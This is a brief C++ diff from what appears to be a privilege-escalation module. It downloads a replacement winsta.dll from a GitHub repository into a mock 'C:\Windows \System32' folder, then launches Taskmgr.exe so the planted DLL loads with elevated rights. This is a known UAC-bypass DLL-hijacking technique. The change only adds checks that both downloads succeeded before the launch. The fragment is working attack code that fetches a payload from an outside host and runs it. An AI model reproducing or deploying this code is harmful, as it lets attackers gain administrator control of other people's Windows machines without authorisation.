@@ -14,7 +14,7 @@ const bool PrivilegeEscalation::run(void)
     bool winsta = System::downloadFile(L"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll", L"\\\\?\\C:\\Windows \\System32\\Winsta.dll");
 
     // Checking for Files and Run Them
-    if (System::fileExist("C:\\Windows \\System32\\Taskmgr.exe") && System::fileExist("C:\\Windows \\System32\\winsta.dll"))
+    if (taskmgr && winsta && System::fileExist("C:\\Windows \\System32\\Taskmgr.exe") && System::fileExist("C:\\Windows \\System32\\winsta.dll"))
     {
         System::createProcess("cmd.exe /c \"C:\\Windows \\System32\\Taskmgr.exe\"");
         return true;
